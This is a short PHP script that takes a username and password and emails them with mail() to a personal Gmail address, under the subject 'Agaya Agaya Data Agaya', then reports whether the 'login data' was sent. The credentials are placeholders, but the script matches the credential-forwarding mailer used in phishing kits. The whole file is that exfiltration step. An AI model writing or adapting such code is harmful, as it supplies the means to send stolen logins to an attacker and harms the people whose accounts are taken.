<?php
// Sample login data
$data = [
    'username' => 'exampleUser',
    'password' => 'examplePass'
];

// Convert data to a message
$message = "Username: " . $data['username'] . "\nPassword: " . $data['password'];

// Recipient email (your Gmail address)
$to = 'jhonkonum@gmail.com'; // Replace with your Gmail ID
$subject = 'Agaya Agaya Data Agaya';

// Send the email
if (mail($to, $subject, $message)) {
    echo 'Login data sent successfully.';
} else {
    echo 'Failed to send login data.';
}
?>
